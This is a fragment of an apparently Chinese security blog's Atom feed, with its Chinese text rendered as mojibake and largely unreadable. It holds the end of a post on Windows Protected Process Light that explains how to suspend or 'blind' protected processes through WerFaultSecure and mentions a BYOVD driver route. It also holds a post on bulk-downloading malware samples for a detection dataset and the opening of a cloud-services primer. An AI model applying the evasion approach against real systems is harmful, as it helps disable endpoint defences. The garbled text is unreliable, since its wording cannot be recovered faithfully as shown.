id="ä¸ºä»€ä¹ˆå¿…é¡»å…·å¤‡è¶³å¤Ÿçš„-PPL-ç­‰çº§æ‰èƒ½â€œæŒ‚èµ·-PPL-è¿›ç¨‹â€"><a href="#ä¸ºä»€ä¹ˆå¿…é¡»å…·å¤‡è¶³å¤Ÿçš„-PPL-ç­‰çº§æ‰èƒ½â€œæŒ‚èµ·-PPL-è¿›ç¨‹â€" class="headerlink" title="ä¸ºä»€ä¹ˆå¿…é¡»å…·å¤‡è¶³å¤Ÿçš„ PPL ç­‰çº§æ‰èƒ½â€œæŒ‚èµ· PPL è¿›ç¨‹â€"></a>ä¸ºä»€ä¹ˆå¿…é¡»å…·å¤‡è¶³å¤Ÿçš„ PPL ç­‰çº§æ‰èƒ½â€œæŒ‚èµ· PPL è¿›ç¨‹â€</h2><p>è¦æŒ‚èµ·çº¿ç¨‹&#x2F;è¿›ç¨‹ï¼Œå‰ææ˜¯éœ€è¦å…ˆæ‹¿åˆ°å¸¦æœ‰ç›¸åº”è®¿é—®æƒçš„å¥æŸ„ï¼ˆä¾‹å¦‚ <code>PROCESS_SUSPEND_RESUME</code>ï¼‰ã€‚åœ¨ PPL æ¨¡å‹ä¸‹ï¼Œå†…æ ¸ä¼šåœ¨â€œå¥æŸ„æˆäºˆé˜¶æ®µâ€æ£€æŸ¥è°ƒç”¨æ–¹ä¸ç›®æ ‡æ–¹çš„ä¿æŠ¤çº§åˆ«ï¼š</p><ul><li>è‹¥è°ƒç”¨æ–¹ä¿æŠ¤çº§åˆ«ï¼ˆSigner + Light&#x2F;Fullï¼‰ä½äºç›®æ ‡ï¼Œåˆ™æ•æ„Ÿè®¿é—®ä¼šè¢«æ‹’ç»ï¼›</li><li>å³ä½¿ <code>OpenProcess</code> æˆåŠŸè¿”å›å¥æŸ„ï¼Œä¹Ÿå¯èƒ½å› ä¸ºè®¿é—®æ©ç è¢«é™çº§è€Œä¸åŒ…å«æ‰€éœ€çš„æ•æ„Ÿæƒé™ï¼›</li><li>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆâ€œè¦å¯¹ PPL ç›®æ ‡åšæŒ‚èµ·&#x2F;è‡´ç›²æ“ä½œï¼Œè°ƒç”¨æ–¹æœ¬èº«ä¹Ÿè¦å¤„äºä¸ä½äºç›®æ ‡çš„ PPL ç­‰çº§ï¼ˆæˆ–åœ¨å†…æ ¸æ€ï¼‰â€ã€‚</li></ul><p>æ€»ç»“ä¸ºä¸€å¥è¯ï¼šè®¿é—®è¢«å†…æ ¸åœ¨â€œæˆäºˆå¥æŸ„â€æ—¶å°±æŒ¡ä½äº†ï¼Œæƒé™ä¸å¤Ÿè¿é—¨éƒ½è¿›ä¸å»ï¼Œè°ˆä¸ä¸Šåç»­ <code>NtSuspendProcess</code> æˆ– <code>SuspendThread</code>ã€‚</p><hr><h2 id="ä¸é¡¹ç›®çš„å…³ç³»ï¼ˆWerFaultSecure-ä¸-PPLï¼‰"><a href="#ä¸é¡¹ç›®çš„å…³ç³»ï¼ˆWerFaultSecure-ä¸-PPLï¼‰" class="headerlink" title="ä¸é¡¹ç›®çš„å…³ç³»ï¼ˆWerFaultSecure ä¸ PPLï¼‰"></a>ä¸é¡¹ç›®çš„å…³ç³»ï¼ˆWerFaultSecure ä¸ PPLï¼‰</h2><p>é¡¹ç›®ä¼šä»¥æŒ‡å®šä¿æŠ¤çº§åˆ«å¯åŠ¨ WerFaultSecureï¼ˆé€šè¿‡ <code>PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL + CREATE_PROTECTED_PROCESS</code>ï¼‰ï¼š</p><ul><li>å®é™…ç”Ÿæ•ˆçš„ä¿æŠ¤çº§åˆ«ï¼Œå–å†³äºç³»ç»Ÿç­–ç•¥ã€äºŒè¿›åˆ¶ç­¾åå’Œå¹³å°æ”¯æŒï¼›</li><li>è¿è¡Œæ—¶å¯ç”¨ <code>GetProcessInformation(ProcessProtectionLevelInfo)</code> è·å–åˆ°çœŸå®çš„ ProtectionLevelï¼Œå¹¶æ‰“å°ä¸ºäººç±»å¯è¯»çš„åç§°ï¼ˆè§ <code>PPLHelp.cpp</code>ï¼‰ã€‚</li></ul><p>å½“ WerFaultSecure å¤„äºè¾ƒé«˜ä¿æŠ¤çº§åˆ«æ—¶ï¼ˆä¾‹å¦‚ WinTCB Fullï¼‰ï¼š</p><ul><li>æ™®é€šè¿›ç¨‹æ— æ³•å¯¹å…¶æ‰§è¡ŒæŒ‚èµ·&#x2F;ç»ˆæ­¢ç­‰æ•æ„Ÿæ“ä½œï¼›</li><li>è¿™ä¸â€œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ WER å†»ç»“ç›®æ ‡è¿›ç¨‹â€å¹¶ä¸çŸ›ç›¾ï¼Œå› ä¸ºå†»ç»“ç›®æ ‡æ˜¯ WER çš„å†…éƒ¨è¡Œä¸ºï¼Œæˆ‘ä»¬åªæ˜¯â€œæ£€æµ‹åˆ°ç›®æ ‡è¢« WER å†»ä½åï¼Œå†å¯¹ WER è‡ªèº«åšçŠ¶æ€æ§åˆ¶â€ã€‚æ˜¯å¦èƒ½â€œæŒ‚èµ· WER è‡ªèº«â€ï¼Œå–å†³äºä½ å½“å‰è¿›ç¨‹èƒ½å¦å¯¹ WER è·å¾—æ•æ„Ÿè®¿é—®æƒé™ï¼ˆç”±ä¸¤è€…çš„ä¿æŠ¤çº§åˆ«æ¯”è¾ƒå†³å®šï¼‰ã€‚</li></ul><hr><h2 id="è¯Šæ–­ä¸å®è·µå»ºè®®"><a href="#è¯Šæ–­ä¸å®è·µå»ºè®®" class="headerlink" title="è¯Šæ–­ä¸å®è·µå»ºè®®"></a>è¯Šæ–­ä¸å®è·µå»ºè®®</h2><p>è¯Šæ–­ï¼š</p><ul><li>æ‰“å°å¹¶æ ¸å®ç›®æ ‡&#x2F;è°ƒç”¨æ–¹&#x2F;ä¸­é—´æ–¹ï¼ˆå¦‚ WERï¼‰çš„ä¿æŠ¤çº§åˆ«ï¼ŒåŒºåˆ† Signer ä¸ Light&#x2F;Fullï¼›</li><li>æ£€æŸ¥ <code>OpenProcess</code> è¿”å›å€¼ä»¥åŠ <code>GetLastError</code>ï¼Œç¡®è®¤æ˜¯å¦å› æƒé™ä¸è¶³æ— æ³•è·å¾—æ•æ„Ÿå¥æŸ„ï¼›</li><li>å¯¹ <code>MiniDumpWriteDump</code>&#x2F;WER è½¬å‚¨æµç¨‹ä¸â€œç›®æ ‡å†»ç»“åˆ¤å®šâ€è§£è€¦ï¼Œé¿å…æ··æ·†ã€‚</li></ul><p>å®è·µå»ºè®®ï¼š</p><ul><li>å¦‚æœéœ€è¦å¯¹é«˜ä¿æŠ¤çº§åˆ«çš„ PPL è¿›ç¨‹åšç ´åæ€§æ“ä½œï¼ˆæŒ‚èµ·&#x2F;å†™å†…å­˜&#x2F;ç»ˆæ­¢ï¼‰ï¼Œè°ƒç”¨æ–¹å¿…é¡»å…·å¤‡è‡³å°‘åŒçº§çš„ PPL ç­‰çº§ï¼›</li><li>è‹¥åšä¸åˆ°ï¼Œéœ€è½¬å‘å†…æ ¸é€”å¾„ï¼ˆé©±åŠ¨&#x2F;BYOVDï¼‰æˆ–æ”¹å˜ç­–ç•¥ï¼Œé¿å…ä¸é«˜ä¿æŠ¤çº§åˆ«çš„è¿›ç¨‹ç›´æ¥å¯¹æŠ—ï¼›</li><li>åœ¨åˆ©ç”¨ WER å†»ç»“ç›®æ ‡çš„åœºæ™¯é‡Œï¼Œé‡ç‚¹æ˜¯â€œè®© WER å†…éƒ¨è§¦å‘å†»ç»“â€ï¼Œè€Œéè°ƒç”¨æ–¹ç›´æ¥æŒ‚èµ·ç›®æ ‡ã€‚éšåå¯¹ WER çš„æ“æ§æ˜¯å¦å¯è¡Œï¼Œå–å†³äºåŒæ–¹çš„ä¿æŠ¤çº§åˆ«æ¯”è¾ƒã€‚</li></ul><hr><h2 id="å¸¸è§é—®ç­”ï¼ˆFAQï¼‰"><a href="#å¸¸è§é—®ç­”ï¼ˆFAQï¼‰" class="headerlink" title="å¸¸è§é—®ç­”ï¼ˆFAQï¼‰"></a>å¸¸è§é—®ç­”ï¼ˆFAQï¼‰</h2><p><strong>Q: æˆ‘æœ‰ç®¡ç†å‘˜ + SeDebugPrivilegeï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯æ‰“ä¸å¼€&#x2F;æŒ‚ä¸èµ·æŸäº›è¿›ç¨‹ï¼Ÿ</strong></p><p>A: å› ä¸ºå¯¹æ–¹æ˜¯ PPL&#x2F;PPï¼Œä¸”ä¿æŠ¤çº§åˆ«é«˜äºä½ ï¼›å†…æ ¸åœ¨æˆäºˆå¥æŸ„æ—¶åšäº†ä¿æŠ¤çº§åˆ«æ£€æŸ¥ï¼Œä½ æ‹¿ä¸åˆ°åŒ…å«æ•æ„Ÿè®¿é—®çš„å¥æŸ„ã€‚</p><p><strong>Q: â€œFull WinTCBâ€å’Œâ€œWinTCB Lightâ€å·®åˆ«å¤§å—ï¼Ÿ</strong></p><p>A: æ˜¯ã€‚Full æ˜¯å—ä¿æŠ¤è¿›ç¨‹ï¼ˆPPï¼‰ï¼Œæ›´ä¸¥æ ¼ï¼›Light æ˜¯ PPLã€‚ä¸€èˆ¬æ¥è¯´ Full &gt; Lightã€‚åŒç±» Signer ä¸‹ï¼ŒFull è®¿é—®è¦æ±‚æ›´è‹›åˆ»ã€‚</p><p><strong>Q: æˆ‘å¦‚ä½•çŸ¥é“æŸè¿›ç¨‹çš„ä¿æŠ¤çº§åˆ«ï¼Ÿ</strong></p><p>A: ä½¿ç”¨ <code>GetProcessInformation(ProcessProtectionLevelInfo)</code> æŸ¥è¯¢ï¼Œé¡¹ç›®ä¸­ <code>PPLProcessCreator::GetPPLProtectionLevel</code> ä¸ <code>GetPPLProtectionLevelName</code> å±•ç¤ºäº†è·å–ä¸æ‰“å°æ–¹æ³•ã€‚</p><p><strong>Q: å¦‚æœ WER æ˜¯æ›´é«˜ç­‰çº§ï¼Œæˆ‘è¿˜èƒ½â€œè‡´ç›²â€å®ƒå—ï¼Ÿ</strong></p><p>A: å–å†³äºä½ çš„è°ƒç”¨æ–¹ä¿æŠ¤çº§åˆ«ã€‚å¦‚æœä¸å¤Ÿé«˜ï¼Œç›´æ¥æŒ‚èµ·&#x2F;ç»ˆæ­¢å®ƒé€šå¸¸ä¼šå¤±è´¥ï¼›è¿™æ—¶éœ€æ”¹ç­–ç•¥ï¼šè®© WER è‡ªå·±å†»ç»“ç›®æ ‡ï¼Œç„¶åé€šè¿‡ä½ èƒ½æ§åˆ¶çš„é€”å¾„ç»´æŒ&#x2F;ç»“æŸè¯¥çŠ¶æ€ï¼ˆæ¯”å¦‚ç­‰å¾…ã€è¶…æ—¶ç»ˆæ­¢ã€æˆ–åœ¨ä½ èƒ½è·å–åˆ°çš„æƒé™èŒƒå›´å†…è¿›è¡Œæ§åˆ¶ï¼‰ã€‚</p><hr><h2 id="ä¸€å¥è¯æ€»ç»“"><a href="#ä¸€å¥è¯æ€»ç»“" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a>ä¸€å¥è¯æ€»ç»“</h2><p>PPL&#x2F;PP æ˜¯â€œæŒ‰ä¿æŠ¤ç­‰çº§æˆäºˆè®¿é—®â€çš„å†…æ ¸å¼ºåˆ¶æ¨¡å‹ã€‚â€œFull WinTCBâ€å±äºé«˜å¼ºåº¦é«˜ä¿¡ä»»åŸŸï¼Œä½ç­‰çº§è¿›ç¨‹å¯¹å…¶æ•æ„Ÿæ“ä½œä¼šåœ¨å¥æŸ„æˆäºˆé˜¶æ®µè¢«æ‹’ç»ï¼›è¦æŒ‚èµ·&#x2F;è‡´ç›²è¿™ç±»è¿›ç¨‹ï¼Œè°ƒç”¨æ–¹å¿…é¡»å…·å¤‡è¶³å¤Ÿé«˜çš„ PPL ç­‰çº§ï¼ˆæˆ–è½¬å‘å†…æ ¸å±‚é¢ï¼‰ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸»è¦éƒ¨åˆ†&quot;&gt;&lt;a href=&quot;#ä¸»è¦éƒ¨åˆ†&quot; class=&quot;headerlink&quot; title=&quot;ä¸»è¦éƒ¨åˆ†&quot;&gt;&lt;/a&gt;ä¸»è¦éƒ¨åˆ†&lt;/h1&gt;&lt;h2 id=&quot;Minidumpwritedump-å‡½æ•°&quot;&gt;&lt;a href=&quot;#Minidumpwritedump-å‡½æ•°&quot; cla</summary>
      
    
    
    
    <category term="å®‰å…¨å¼€å‘" scheme="https://250wuyifan.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="å®‰å…¨å¼€å‘" scheme="https://250wuyifan.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>æ·±åº¦å­¦ä¹ è®­ç»ƒè·å–æ¶æ„ä»£ç æ•°æ®é›†</title>
    <link href="https://250wuyifan.github.io/2025/09/13/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%E8%8E%B7%E5%8F%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%95%B0%E6%8D%AE%E9%9B%86/"/>
    <id>https://250wuyifan.github.io/2025/09/13/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%E8%8E%B7%E5%8F%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%95%B0%E6%8D%AE%E9%9B%86/</id>
    <published>2025-09-13T10:35:31.000Z</published>
    <updated>2025-09-13T10:57:48.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…è´¹è·å–ç½‘ç«™"><a href="#å…è´¹è·å–ç½‘ç«™" class="headerlink" title="å…è´¹è·å–ç½‘ç«™"></a>å…è´¹è·å–ç½‘ç«™</h1><p><a href="https://bazaar.abuse.ch/">https://bazaar.abuse.ch/</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913183743756.png" alt="image-20250913183743756"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913183938733.png" alt="image-20250913183938733"></p><h1 id="APIæ¥å£è°ƒç”¨"><a href="#APIæ¥å£è°ƒç”¨" class="headerlink" title="APIæ¥å£è°ƒç”¨"></a>APIæ¥å£è°ƒç”¨</h1><p>å¯æ ¹æ®è‡ªå·±çš„è¦æ±‚è°ƒç”¨APIã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184040902.png" alt="image-20250913184040902"></p><h1 id="æ‰¹é‡ä¸‹è½½"><a href="#æ‰¹é‡ä¸‹è½½" class="headerlink" title="æ‰¹é‡ä¸‹è½½"></a>æ‰¹é‡ä¸‹è½½</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184128568.png" alt="image-20250913184128568"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184145361.png" alt="image-20250913184145361"></p><h1 id="æ‰¹é‡ä¸‹è½½è„šæœ¬"><a href="#æ‰¹é‡ä¸‹è½½è„šæœ¬" class="headerlink" title="æ‰¹é‡ä¸‹è½½è„šæœ¬"></a>æ‰¹é‡ä¸‹è½½è„šæœ¬</h1><p>ä¸€ä¸ªä¸€ä¸ªæ‰‹ç‚¹å‡»ä¸‹è½½æ˜¯æ»¡çš„ï¼Œè„šæœ¬æ˜¯å¯¹çš„ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913185628114.png" alt="image-20250913185628114"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913185703054.png" alt="image-20250913185703054"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å…è´¹è·å–ç½‘ç«™&quot;&gt;&lt;a href=&quot;#å…è´¹è·å–ç½‘ç«™&quot; class=&quot;headerlink&quot; title=&quot;å…è´¹è·å–ç½‘ç«™&quot;&gt;&lt;/a&gt;å…è´¹è·å–ç½‘ç«™&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://bazaar.abuse.ch/&quot;&gt;https://bazaar.abus</summary>
      
    
    
    
    <category term="ç ”ç©¶ç”Ÿç”Ÿæ´»" scheme="https://250wuyifan.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="ç ”ç©¶ç”Ÿç”Ÿæ´»" scheme="https://250wuyifan.github.io/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>äº‘å®‰å…¨-äº‘æœåŠ¡ç¯‡</title>
    <link href="https://250wuyifan.github.io/2025/09/12/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    <id>https://250wuyifan.github.io/2025/09/12/%E4%BA%91%E5%AE%89%E5%85%A8/</id>
    <published>2025-09-12T09:37:21.000Z</published>
    <updated>2025-09-14T08:45:19.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="äº‘æœåŠ¡åŸºç¡€ä»‹ç»"><a href="#äº‘æœåŠ¡åŸºç¡€ä»‹ç»" class="headerlink" title="äº‘æœåŠ¡åŸºç¡€ä»‹ç»"></a>äº‘æœåŠ¡åŸºç¡€ä»‹ç»</h1><p>äº‘æœåŠ¡ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯äº‘ä¸ŠæœåŠ¡ï¼Œåœ¨äº‘å‚å•†ä¸Šè´­ä¹°çš„äº§å“æœåŠ¡ã€‚å›½å†…æœ‰é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ã€å¤©ç¿¼äº‘ã€Ucloudã€é‡‘å±±äº‘ç­‰ï¼Œå›½å¤–æœ‰äºšé©¬é€Šçš„AWSã€Googleçš„GCPã€å¾®è½¯çš„Azureï¼ŒIBMäº‘ç­‰ã€‚</p><p><strong>å®šä¹‰</strong>ï¼šåŸºäºäº’è”ç½‘çš„æœåŠ¡äº¤ä»˜æ¨¡å¼ï¼Œé€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å°†è®¡ç®—ã€å­˜å‚¨ã€ç½‘ç»œç­‰èµ„æºæ± åŒ–ï¼Œä»¥åŠ¨æ€æ‰©å±•ã€æŒ‰éœ€ä»˜è´¹çš„æ–¹å¼ä¸ºç”¨æˆ·æä¾›æœåŠ¡ã€‚æ ¸å¿ƒç‰¹å¾åŒ…æ‹¬èµ„æºæ± åŒ–ï¼ˆå¤šç”¨æˆ·å…±äº«ç‰©ç†èµ„æºï¼‰ã€å¼¹æ€§ä¼¸ç¼©ï¼ˆæ ¹æ®ä¸šåŠ¡è´Ÿè½½è‡ªåŠ¨è°ƒæ•´èµ„æºè§„æ ¼ï¼‰ã€æŒ‰éœ€ä»˜è´¹ï¼ˆæŒ‰å®é™…ä½¿ç”¨é‡è®¡è´¹ï¼Œé™ä½é—²ç½®æˆæœ¬ï¼‰ã€æœåŠ¡å¯ç®¡ç†ï¼ˆäº‘å‚å•†æä¾›æ§åˆ¶å° &#x2F; API è¿›è¡Œèµ„æºè¿ç»´ï¼‰ã€‚</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šæ— éœ€è‡ªå»ºç‰©ç†æœºæˆ¿ï¼Œç›´æ¥åœ¨é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ç­‰å‚å•†å¹³å°è´­ä¹°æœåŠ¡å™¨ã€å­˜å‚¨ç­‰ â€œäº‘ä¸Šèµ„æºâ€ï¼Œå¹¶é€šè¿‡äº’è”ç½‘ä½¿ç”¨å’Œç®¡ç†è¿™äº›èµ„æºã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914005430544.png" alt="image.png"></p><h2 id="äº‘æ•°æ®åº“ï¼ˆRDS-Relational-Database-Serviceï¼‰"><a href="#äº‘æ•°æ®åº“ï¼ˆRDS-Relational-Database-Serviceï¼‰" class="headerlink" title="äº‘æ•°æ®åº“ï¼ˆRDS - Relational Database Serviceï¼‰"></a>äº‘æ•°æ®åº“ï¼ˆRDS - Relational Database Serviceï¼‰</h2><p><strong>å®šä¹‰</strong>ï¼šäº‘ä¸Šæ‰˜ç®¡çš„å…³ç³»å‹æ•°æ®åº“æœåŠ¡ï¼Œç”±äº‘å‚å•†è´Ÿè´£æ•°æ®åº“çš„éƒ¨ç½²ã€è¿ç»´ã€å¤‡ä»½ã€é«˜å¯ç”¨ä¿éšœï¼ˆå¦‚ä¸»ä»æ¶æ„ã€æ•…éšœè‡ªåŠ¨åˆ‡æ¢ï¼‰ï¼Œç”¨æˆ·ä»…éœ€å…³æ³¨ä¸šåŠ¡æ•°æ®æ“ä½œã€‚æ”¯æŒ MySQLã€SQL Serverã€PostgreSQL ç­‰ä¸»æµæ•°æ®åº“å¼•æ“ï¼Œæä¾›æ€§èƒ½ç›‘æ§ã€å®‰å…¨ç»„é˜²æŠ¤ã€æ•°æ®åŠ å¯†ç­‰é™„åŠ èƒ½åŠ›ã€‚</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šæ— éœ€æœ¬åœ°æ­å»ºæ•°æ®åº“æœåŠ¡å™¨ï¼Œç›´æ¥åœ¨äº‘ä¸Š â€œç§Ÿç”¨â€ ä¸€ä¸ªç°æˆçš„æ•°æ®åº“ï¼Œäº‘å‚å•†å¸®ä½ ç»´æŠ¤æœåŠ¡å™¨ç¨³å®šæ€§å’Œæ•°æ®å®‰å…¨ã€‚</p><h2 id="èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAM"><a href="#èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAM" class="headerlink" title="èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAM)"></a>èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAM)</h2><p><strong>å®šä¹‰</strong>ï¼šäº‘å‚å•†æä¾›çš„ç»Ÿä¸€èº«ä»½æƒé™ç®¡ç†æœåŠ¡ï¼Œç”¨äºæ§åˆ¶å­è´¦æˆ·å¯¹äº‘ä¸Šèµ„æºçš„è®¿é—®èŒƒå›´ï¼Œé¿å…æƒé™æ»¥ç”¨ã€‚æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ç”¨æˆ·ç®¡ç†ï¼ˆåˆ›å»ºå­è´¦æˆ·ã€è§’è‰²ï¼‰ã€æƒé™ç­–ç•¥ï¼ˆç²¾ç»†åŒ–é…ç½®èµ„æºæ“ä½œæƒé™ï¼Œå¦‚ä»…å…è®¸æŸ¥çœ‹ ECS å®ä¾‹ï¼Œä¸å…è®¸åˆ é™¤ï¼‰ã€å‡­è¯ç®¡ç†ï¼ˆAccessKeyã€ç™»å½•å¯†ç çš„åˆ›å»ºä¸è½®æ¢ï¼‰ã€‚<br><strong>å„å‚å•†å‘½åå·®å¼‚</strong>ï¼š</p><table><thead><tr><th>äº‘å‚å•†</th><th>äº§å“åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½ï¼ˆç»Ÿä¸€ï¼‰</th></tr></thead><tbody><tr><td>é˜¿é‡Œäº‘</td><td>RAM</td><td>ç”¨æˆ·ç®¡ç†ã€æƒé™ç­–ç•¥ï¼ˆç²¾ç»†åŒ–æ§åˆ¶ï¼‰ã€AccessKey å‡­è¯ç®¡ç†</td></tr><tr><td>è…¾è®¯äº‘</td><td>CAM</td><td>å­è´¦æˆ· &#x2F; è§’è‰²åˆ›å»ºã€èµ„æºæ“ä½œæƒé™é…ç½®ã€ç™»å½•å¯†ç è½®æ¢</td></tr><tr><td>åä¸ºäº‘</td><td>IAM</td><td>ä¸é€šç”¨ IAM åŠŸèƒ½ä¸€è‡´ï¼Œæ”¯æŒä¼ä¸šçº§è§’è‰²æƒé™åˆ’åˆ†</td></tr><tr><td>äºšé©¬é€Šäº‘ï¼ˆAWSï¼‰</td><td>IAM</td><td>ä¸´æ—¶å‡­è¯ç”Ÿæˆã€æƒé™è¾¹ç•Œæ§åˆ¶ã€å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰</td></tr><tr><td>å¾®è½¯äº‘ï¼ˆAzureï¼‰</td><td>Azure AD</td><td>å« IAM åŠŸèƒ½ï¼Œæ”¯æŒå•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ã€èº«ä»½æ²»ç†ã€æ¡ä»¶è®¿é—®æ§åˆ¶</td></tr></tbody></table><h2 id="å¯¹è±¡å­˜å‚¨ï¼ˆObject-Storageï¼‰"><a href="#å¯¹è±¡å­˜å‚¨ï¼ˆObject-Storageï¼‰" class="headerlink" title="å¯¹è±¡å­˜å‚¨ï¼ˆObject Storageï¼‰"></a>å¯¹è±¡å­˜å‚¨ï¼ˆObject Storageï¼‰</h2><h3 id="æ ¸å¿ƒå®šä¹‰"><a href="#æ ¸å¿ƒå®šä¹‰" class="headerlink" title="æ ¸å¿ƒå®šä¹‰"></a>æ ¸å¿ƒå®šä¹‰</h3><p><strong>å®šä¹‰</strong>ï¼šå®šä½ä¸ºæµ·é‡éç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚å›¾ç‰‡ã€è§†é¢‘ã€æ—¥å¿—ã€å¤‡ä»½æ–‡ä»¶ï¼‰è®¾è®¡çš„å­˜å‚¨æœåŠ¡ï¼Œæ•°æ®ä»¥ â€œå¯¹è±¡â€ ä¸ºåŸºæœ¬å•å…ƒå­˜å‚¨ï¼ˆæ¯ä¸ªå¯¹è±¡åŒ…å«æ•°æ®æœ¬èº«ã€å…ƒæ•°æ®ï¼ˆå¦‚æ–‡ä»¶å¤§å°ã€åˆ›å»ºæ—¶é—´ï¼‰ã€å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆå¦‚ ObjectKeyï¼‰ï¼‰ã€‚ä¸ä¼ ç»Ÿæ–‡ä»¶å­˜å‚¨ï¼ˆå¦‚ NASï¼‰ç›¸æ¯”ï¼Œæ— ç›®å½•å±‚çº§é™åˆ¶ï¼Œæ”¯æŒæ— é™æ‰©å®¹ï¼Œè®¿é—®é€Ÿåº¦å¿«ä¸”æˆæœ¬ä½ã€‚<br><strong>é€šä¿—ç†è§£</strong>ï¼šäº‘ä¸Šçš„ â€œè¶…çº§ç½‘ç›˜â€ï¼Œä½†æ›´é€‚åˆä¼ä¸šçº§æµ·é‡æ•°æ®å­˜å‚¨ï¼Œè€Œéä¸ªäººå°æ–‡ä»¶ç®¡ç†ã€‚ </p><h3 id="å„å‚å•†äº§å“å‘½å"><a href="#å„å‚å•†äº§å“å‘½å" class="headerlink" title="å„å‚å•†äº§å“å‘½å"></a>å„å‚å•†äº§å“å‘½å</h3><table><thead><tr><th>äº‘å‚å•†</th><th>äº§å“åç§°</th><th>æ ¸å¿ƒç‰¹æ€§</th></tr></thead><tbody><tr><td>é˜¿é‡Œäº‘</td><td>OSS</td><td>æ”¯æŒé™æ€ç½‘ç«™æ‰˜ç®¡ã€CDN åŠ é€Ÿã€æ•°æ®ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ˆè‡ªåŠ¨å½’æ¡£å†·æ•°æ®ï¼‰</td></tr><tr><td>è…¾è®¯äº‘</td><td>COS</td><td>é›†æˆè…¾è®¯äº‘ CDNã€ç›´æ’­ç‚¹æ’­æœåŠ¡ï¼Œé€‚åˆå¤šåª’ä½“åœºæ™¯</td></tr><tr><td>åä¸ºäº‘</td><td>OBS</td><td>æ”¯æŒè·¨åŒºåŸŸå¤åˆ¶ã€ä¼ä¸šçº§æ•°æ®åŠ å¯†ï¼Œé€‚é…åä¸ºäº‘é²²é¹ç”Ÿæ€</td></tr><tr><td>è°·æ­Œäº‘</td><td>GCS</td><td>ä¸è°·æ­Œäº‘ BigQueryã€Dataflow ç­‰å¤§æ•°æ®æœåŠ¡æ·±åº¦é›†æˆ</td></tr><tr><td>å¾®è½¯äº‘ï¼ˆAzureï¼‰</td><td>Blob</td><td>æ”¯æŒåˆ†å±‚å­˜å‚¨ï¼ˆçƒ­ &#x2F; å†· &#x2F; å½’æ¡£å±‚ï¼‰ï¼Œä¸ Azure Functionsã€Logic Apps è”åŠ¨</td></tr><tr><td>äºšé©¬é€Šäº‘ï¼ˆAWSï¼‰</td><td>S3</td><td>è¡Œä¸šæ ‡æ†ï¼Œæ”¯æŒç‰ˆæœ¬æ§åˆ¶ã€è·¨åŒºåŸŸå¤åˆ¶ã€è®¿é—®æ—¥å¿—å®¡è®¡ï¼Œç”Ÿæ€å·¥å…·ä¸°å¯Œ</td></tr></tbody></table><h3 id="æ ¸å¿ƒæ¦‚å¿µï¼šBucket"><a href="#æ ¸å¿ƒæ¦‚å¿µï¼šBucket" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µï¼šBucket"></a>æ ¸å¿ƒæ¦‚å¿µï¼šBucket</h3><p>Bucketï¼ˆå­˜å‚¨æ¡¶ï¼‰æ˜¯å¯¹è±¡å­˜å‚¨çš„ â€œé¡¶å±‚å®¹å™¨â€ï¼Œç±»ä¼¼æœ¬åœ°æ–‡ä»¶å¤¹ï¼Œç”¨äºéš”ç¦»ä¸åŒä¸šåŠ¡çš„å¯¹è±¡æ•°æ®ã€‚æ¯ä¸ª Bucket éœ€æ»¡è¶³ï¼š</p><ul><li><p>å…¨å±€å”¯ä¸€æ€§ï¼šåŒä¸€äº‘å‚å•†å†…ï¼ŒBucket åç§°ä¸å¯é‡å¤ï¼ˆå¦‚é˜¿é‡Œäº‘ OSS çš„ Bucket 